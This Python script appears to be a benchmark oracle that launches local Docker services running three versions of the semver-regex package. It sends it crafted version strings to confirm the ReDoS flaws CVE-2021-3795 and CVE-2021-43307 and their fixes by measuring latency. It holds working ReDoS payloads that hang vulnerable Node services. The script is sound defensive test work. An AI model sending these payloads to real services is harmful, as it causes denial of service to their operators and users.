#!/usr/bin/env python3
"""dos-threshold oracle for semver-regex pre-release ReDoS over a REAL HTTP service
(CVE-2021-3795 -> CVE-2021-43307).

No flag token: the signal is SERVER-SIDE latency of an EXTERNAL HTTP request. For each version
{v0=3.1.1, v1=3.1.3, v2=3.1.4} we bring up a REAL Express service that validates a user-supplied
version string with the REAL published `semver-regex` (POST /check -> semverRegex().test(version),
running synchronously on the event loop). The oracle POSTs three payloads {original, residual,
benign} from OUTSIDE the container and measures the HTTP round-trip latency (dominated by the
server-side regex compute); a catastrophic input hangs the response until the HTTP timeout.

GATE booleans (T_FAST=300ms, T_SLOW=2000ms, HTTP read timeout=10s):
  original_slow_on_v0    : v0.original latency > T_SLOW   (CVE-2021-3795 unbounded-greedy vector fires on V0)
  original_bounded_on_v1 : v1.original latency < T_FAST   (3.1.3 lazy+{0,100}+`\\b` fix closes the original)
  residual_slow_on_v1    : v1.residual latency > T_SLOW   (V1 fix INCOMPLETE: nested {0,100} groups still backtrack)
  residual_fast_on_v2    : v2.residual latency < T_FAST   (3.1.4 lazy `{0,100}?` bounds close the residual)
  benign_fast_on_all     : every version's benign latency < T_FAST
  residual_v1_over_v2_gt_50x : clean latency separation on V1 vs V2 for the residual
  passed = all of the above
"""
from __future__ import annotations
import http.client
import json
import os
import socket
import subprocess
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
COMPOSE = ["docker", "compose", "-f", os.path.join(HERE, "docker-compose.yml")]
ENV = {**os.environ, "PCB_FLAG": "dos-threshold-no-canary"}

T_FAST = 300.0        # ms  (external HTTP round-trip for a bounded regex + JSON)
T_SLOW = 2000.0       # ms
HTTP_TIMEOUT_S = 10.0
HTTP_TIMEOUT_MS = HTTP_TIMEOUT_S * 1000.0

PORTS = {"v0": 28131, "v1": 28133, "v2": 28134}

PAYLOADS = {
    # original CVE-2021-3795 vector: dotted run of ambiguous pre-release idents, trailing '!' fails V0's (?=$|\s)
    "original": "1.2.3-" + "a-a." * 22 + "!",
    # residual CVE-2021-43307 vector: dash/dot run, trailing space fails V1's \b and blows up the nested {0,100}
    "residual": "0.0.1-" + "-.--" * 14 + " ",
    # benign control: a normal semver
    "benign": "1.2.3-alpha.1",
}


def run(cmd, **kw):
    print("+", " ".join(cmd), flush=True)
    return subprocess.run(cmd, env=ENV, **kw)


def wait_health(port: int, timeout_s: float = 120.0) -> bool:
    deadline = time.time() + timeout_s
    while time.time() < deadline:
        try:
            c = http.client.HTTPConnection("127.0.0.1", port, timeout=3)
            c.request("GET", "/health")
            r = c.getresponse()
            body = r.read()
            c.close()
            if r.status == 200 and b'"ok"' in body:
                return True
        except (ConnectionRefusedError, socket.timeout, OSError):
            pass
        time.sleep(1.0)
    return False


def probe(port: int, payload: str) -> dict:
    """POST /check {version: payload}; measure external HTTP round-trip latency (ms).
    On catastrophic backtracking the server hangs -> socket read timeout -> recorded as HTTP_TIMEOUT_MS."""
    body = json.dumps({"version": payload})
    t0 = time.perf_counter()
    try:
        c = http.client.HTTPConnection("127.0.0.1", port, timeout=HTTP_TIMEOUT_S)
        c.request("POST", "/check", body=body,
                  headers={"Content-Type": "application/json", "Content-Length": str(len(body))})
        r = c.getresponse()
        resp = r.read()
        c.close()
        ms = (time.perf_counter() - t0) * 1000.0
        return {"ms": round(ms, 1), "timeout": False, "len": len(payload),
                "resp": resp.decode("utf-8", "replace")[:200]}
    except (socket.timeout, TimeoutError):
        ms = (time.perf_counter() - t0) * 1000.0
        return {"ms": round(max(ms, HTTP_TIMEOUT_MS), 1), "timeout": True, "len": len(payload), "resp": None}
    except OSError as e:
        return {"ms": -1.0, "timeout": False, "error": str(e), "len": len(payload), "resp": None}


def measure_profile(prof: str) -> dict:
    """Measure each payload against a FRESH server. A synchronous ReDoS permanently wedges Node's
    single-threaded event loop (the regex cannot be interrupted mid-run), so a slow probe would
    poison any probe sent to the SAME server afterwards. We therefore `kill` (instant SIGKILL) +
    `up -d` (restart -> brand-new node process, clean event loop) before every probe."""
    port = PORTS[prof]
    results = {}
    try:
        for kind in ("original", "residual", "benign"):
            run(COMPOSE + ["--profile", prof, "stop", prof], check=False,
                capture_output=True, text=True)
            run(COMPOSE + ["--profile", prof, "rm", "-f", prof], check=False,
                capture_output=True, text=True)
            run(COMPOSE + ["--profile", prof, "up", "-d"], check=True,
                capture_output=True, text=True)
            if not wait_health(port):
                raise RuntimeError(f"{prof}: /health never came up on :{port}")
            r = probe(port, PAYLOADS[kind])
            results[kind] = r
            print(f"[{prof}] {kind:9s} len={r['len']:>3} -> {r['ms']:>8}ms timeout={r.get('timeout')}",
                  flush=True)
        return {"version": prof, "port": port, "results": results}
    finally:
        run(COMPOSE + ["--profile", prof, "kill", prof], check=False,
            capture_output=True, text=True)
        run(COMPOSE + ["--profile", prof, "down"], check=False,
            capture_output=True, text=True)


def main():
    t_start = time.time()
    versions = {}
    for prof in ("v0", "v1", "v2"):
        versions[prof] = measure_profile(prof)

    def ms(v, kind):
        return versions[v]["results"][kind]["ms"]

    matrix = {v: {k: versions[v]["results"][k]["ms"] for k in ("original", "residual", "benign")}
              for v in versions}

    booleans = {
        "original_slow_on_v0": ms("v0", "original") > T_SLOW,
        "original_bounded_on_v1": ms("v1", "original") < T_FAST,
        "residual_slow_on_v1": ms("v1", "residual") > T_SLOW,
        "residual_fast_on_v2": ms("v2", "residual") < T_FAST,
        "benign_fast_on_all": all(ms(v, "benign") < T_FAST for v in versions),
    }
    resid_v1, resid_v2 = ms("v1", "residual"), max(ms("v2", "residual"), 0.001)
    booleans["residual_v1_over_v2_gt_50x"] = (resid_v1 / resid_v2) > 50.0
    booleans["passed"] = all(booleans.values())

    report = {
        "case": "semver_regex_prerelease_redos",
        "oracle_variant": "dos-threshold",
        "run_mode": "real-app-http",
        "external_http_trigger": True,
        "thresholds": {"T_FAST_ms": T_FAST, "T_SLOW_ms": T_SLOW, "http_timeout_ms": HTTP_TIMEOUT_MS},
        "payloads": {k: {"str": v, "len": len(v)} for k, v in PAYLOADS.items()},
        "latency_matrix_ms": matrix,
        "residual_v1_over_v2_ratio": round(resid_v1 / resid_v2, 1),
        "booleans": booleans,
        "elapsed_s": round(time.time() - t_start, 1),
    }
    print("\n=== GATE REPORT ===")
    print(json.dumps(report, indent=2))
    with open(os.path.join(HERE, "gate_result.json"), "w") as f:
        json.dump(report, f, indent=2)
    return 0 if booleans["passed"] else 1


if __name__ == "__main__":
    sys.exit(main())
